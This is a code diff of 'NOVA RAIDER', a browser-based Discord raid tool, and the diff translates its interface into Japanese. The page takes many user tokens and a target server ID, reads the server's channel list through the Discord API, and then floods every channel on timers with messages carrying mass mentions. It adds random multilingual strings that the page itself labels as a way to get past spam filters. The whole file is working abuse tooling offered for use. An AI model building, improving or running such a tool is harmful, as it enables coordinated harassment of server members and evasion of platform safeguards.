@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NOVA RAIDER - Custom Tactical</title>
+    <title>NOVA RAIDER - 日本語カスタムエディション</title>
     <style>
         :root {
             --bg-color: #0d0d12;
@@ -17,7 +17,7 @@
         }
 
         body {
-            font-family: 'Segoe UI', 'Hiragino Kaku Gothic ProN', sans-serif;
+            font-family: 'Helvetica Neue', 'Arial', 'Hiragino Kaku Gothic ProN', 'Hiragino Sans', 'Meiryo', sans-serif;
             background-color: var(--bg-color);
             color: var(--text-color);
             display: flex;
@@ -40,7 +40,7 @@
         .brand-title { margin: 0; font-size: 32px; font-weight: 900; letter-spacing: 4px; color: var(--primary); text-shadow: 0 0 15px rgba(0, 212, 255, 0.3); }
 
         .section { margin-bottom: 20px; }
-        label { display: block; font-size: 11px; margin-bottom: 6px; color: var(--primary); font-weight: bold; text-transform: uppercase; }
+        label { display: block; font-size: 12px; margin-bottom: 8px; color: var(--primary); font-weight: bold; }
 
         textarea, input, select {
             width: 100%; padding: 12px; background: var(--input-bg); border: 1px solid var(--border);
@@ -52,10 +52,10 @@
         .flex-2 { flex: 2; }
 
         .controls { display: flex; gap: 12px; margin-top: 25px; }
-        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
+        .btn { flex: 1; padding: 15px; border: none; border-radius: 8px; font-weight: bold; cursor: pointer; text-transform: uppercase; transition: 0.3s; font-size: 14px; }
         .btn-primary { background: var(--primary); color: #000; }
         .btn-danger { background: var(--danger); color: white; }
-        .btn:disabled { opacity: 0.3; filter: grayscale(1); }
+        .btn:disabled { opacity: 0.3; filter: grayscale(1); cursor: not-allowed; }
 
         .status-panel {
             margin-top: 20px; padding: 15px; background: rgba(0,0,0,0.3);
@@ -64,10 +64,11 @@
         }
 
         #logBoard {
-            margin-top: 15px; height: 150px; background: #05050a; border: 1px solid var(--border);
-            border-radius: 8px; padding: 10px; font-size: 11px; overflow-y: scroll; color: #888;
+            margin-top: 15px; height: 160px; background: #05050a; border: 1px solid var(--border);
+            border-radius: 8px; padding: 10px; font-size: 11px; overflow-y: scroll; color: #aaa;
         }
         .log-entry { border-bottom: 1px solid #1a1a2a; padding: 4px 0; }
+        .log-time { color: #666; margin-right: 8px; }
     </style>
 </head>
 <body>
@@ -75,65 +76,68 @@
 <div class="container">
     <header>
         <h1 class="brand-title">NOVA RAIDER</h1>
-        <p style="font-size: 10px; opacity: 0.5; text-align: center;">V3 - MULTI-LANGUAGE ANTI-SPAM SYSTEM</p>
+        <p style="font-size: 11px; opacity: 0.6; text-align: center; letter-spacing: 1px;">多言語回避システム搭載 - 日本語版</p>
     </header>
 
     <div class="section">
-        <label>User Tokens (1 per line)</label>
-        <textarea id="tokens" style="height: 80px;" placeholder="Paste tokens here..."></textarea>
+        <label>使用トークン (1行に1つ入力)</label>
+        <textarea id="tokens" style="height: 100px;" placeholder="ここにトークンを貼り付けてください..."></textarea>
     </div>
 
     <div class="form-row section">
         <div class="flex-2">
-            <label>Target Guild ID</label>
-            <input type="text" id="guildId" placeholder="1234567890">
+            <label>ターゲットサーバーID (Guild ID)</label>
+            <input type="text" id="guildId" placeholder="例: 123456789012345678">
         </div>
         <div class="flex-1">
-            <label>Interval (ms)</label>
+            <label>送信間隔 (ミリ秒)</label>
             <input type="number" id="interval" value="1000" min="50">
         </div>
     </div>
 
-    <div class="form-row section" style="background: rgba(0,212,255,0.05); padding: 15px; border-radius: 8px; border: 1px dashed var(--border);">
-        <div class="flex-2">
-            <label>Random String Language</label>
-            <select id="langSelect">
-                <option value="en">English (abcd...)</option>
-                <option value="alnum">Alphanumeric (a1b2...)</option>
-                <option value="ko">Korean (한국어)</option>
-                <option value="ar">Arabic (العربية)</option>
-                <option value="km">Khmer (ភាសាខ្មែរ)</option>
-            </select>
-        </div>
-        <div class="flex-1">
-            <label>String Length</label>
-            <input type="number" id="strLength" value="10" min="1" max="100">
+    <div class="section" style="background: rgba(0,212,255,0.03); padding: 15px; border-radius: 8px; border: 1px solid var(--border);">
+        <label style="color: var(--success);">スパム回避用ランダム文字列設定</label>
+        <div class="form-row">
+            <div class="flex-2">
+                <label style="font-size: 10px; opacity: 0.8;">使用言語を選択</label>
+                <select id="langSelect">
+                    <option value="en">英語 (abcde...)</option>
+                    <option value="alnum">英数字 (a1b2c...)</option>
+                    <option value="ko">韓国語 (ハングル)</option>
+                    <option value="ar">アラビア語 (العربية)</option>
+                    <option value="km">クメール語 (ភាសាខ្មែរ)</option>
+                </select>
+            </div>
+            <div class="flex-1">
+                <label style="font-size: 10px; opacity: 0.8;">文字数</label>
+                <input type="number" id="strLength" value="12" min="1" max="100">
+            </div>
         </div>
     </div>
 
     <div class="form-row section">
         <div class="flex-1">
-            <label>Mention Count</label>
+            <label>メンション人数 / 回</label>
             <input type="number" id="mentionCount" value="3" min="0" max="15">
         </div>
         <div class="flex-2">
-            <label>Message Content</label>
-            <input type="text" id="message" placeholder="Spam message here...">
+            <label>送信メッセージ本文</label>
+            <input type="text" id="message" placeholder="メッセージを入力してください">
         </div>
     </div>
 
     <div class="controls">
-        <button id="startBtn" class="btn btn-primary" onclick="startRaid()">NOVA 起動</button>
+        <button id="startBtn" class="btn btn-primary" onclick="startRaid()">RAIDER 起動</button>
         <button id="stopBtn" class="btn btn-danger" onclick="stopRaid()" disabled>停止</button>
     </div>
 
     <div class="status-panel">
-        <span>STATUS: <strong id="statusText" style="color: #666;">READY</strong></span>
-        <span>SENT: <strong id="sentCount" style="color: var(--primary);">0</strong></span>
+        <span>ステータス: <strong id="statusText" style="color: #666;">待機中</strong></span>
+        <span>送信済み件数: <strong id="sentCount" style="color: var(--primary);">0</strong></span>
     </div>
 
     <div id="logBoard">
-        <div class="log-entry">システムスタンバイ完了。言語設定を確認してください。</div>
+        <div class="log-entry">システム準備完了。トークンとサーバーIDを入力してください。</div>
     </div>
 </div>
 
@@ -146,9 +150,9 @@
     const charSets = {
         en: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ",
         alnum: "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789",
-        ko: "가나다라마바사아자차카타파하거너더러머버서어저처커터퍼허기니ディリミビシイジチキティピヒ", // ハングル
-        ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي", // アラビア文字
-        km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ" // クメール文字
+        ko: "가나다라마바사아자차카타파하거너더러머バーサーアーヂャーチャーキャータパハギニディリミビシイジチキティピヒ", 
+        ar: "ابتثجحخدذرزسشصضطظعغفقكلمنهوي", 
+        km: "កខគឃងចឆជឈញដឋឌឍណតថទធនបផពភមយរលវសហឡអ" 
     };
 
     function addLog(msg, color = "") {
@@ -156,7 +160,8 @@
         const div = document.createElement('div');
         div.className = 'log-entry';
         if (color) div.style.color = color;
-        div.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        const time = new Date().toLocaleTimeString();
+        div.innerHTML = `<span class="log-time">[${time}]</span> ${msg}`;
         board.prepend(div);
     }
 
@@ -176,16 +181,17 @@
         const lang = document.getElementById('langSelect').value;
         const len = parseInt(document.getElementById('strLength').value);
 
-        if (!tokens.length || !guildId) return alert("入力エラー: トークンまたはサーバーIDが空です。");
+        if (!tokens.length || !guildId) return alert("エラー: トークンとサーバーIDは必須です。");
 
         document.getElementById('startBtn').disabled = true;
         document.getElementById('stopBtn').disabled = false;
-        document.getElementById('statusText').innerText = "RUNNING";
+        document.getElementById('statusText').innerText = "稼働中";
         document.getElementById('statusText').style.color = "var(--success)";
 
-        addLog("サーバーデータ取得中...", "var(--primary)");
+        addLog("サーバー情報を取得しています...", "var(--primary)");
 
         try {
+            // 最初のトークンを使用して情報を取得
             const res = await fetch(`https://discord.com/api/v9/guilds/${guildId}/channels`, {
                 headers: { 'Authorization': tokens[0] }
             });
@@ -200,7 +206,9 @@
 
             addLog(`${chs.length}個のチャンネルを捕捉。攻撃を開始します。`, "var(--success)");
         } catch (e) {
-            addLog("初期化エラー。トークンの権限を確認してください。", "var(--danger)");
+            addLog("初期化エラー。サーバーIDかトークンの権限を確認してください。", "var(--danger)");
+            stopRaid();
+            return;
         }
 
         tokens.forEach((token, i) => {
@@ -213,7 +221,7 @@
                 }
 
                 const randStr = generateRandomStr(lang, len);
-                const content = `${mentions} ${document.getElementById('message').value} \n**${randStr}**`;
+                const content = `${mentions} ${document.getElementById('message').value} \n\n# ${randStr}`;
 
                 try {
                     const post = await fetch(`https://discord.com/api/v9/channels/${target}/messages`, {
@@ -226,7 +234,7 @@
                         document.getElementById('sentCount').innerText = sentCounter;
                     }
                 } catch (err) {}
-            }, interval + (i * 10));
+            }, interval + (i * 20));
             raidIntervals.push(inv);
         });
     }
@@ -236,9 +244,9 @@
         raidIntervals = [];
         document.getElementById('startBtn').disabled = false;
         document.getElementById('stopBtn').disabled = true;
-        document.getElementById('statusText').innerText = "STOPPED";
+        document.getElementById('statusText').innerText = "停止中";
         document.getElementById('statusText').style.color = "var(--danger)";
-        addLog("全インスタンスを停止しました。", "orange");
+        addLog("すべての処理を停止しました。", "#ffa500");
     }
 </script>
 
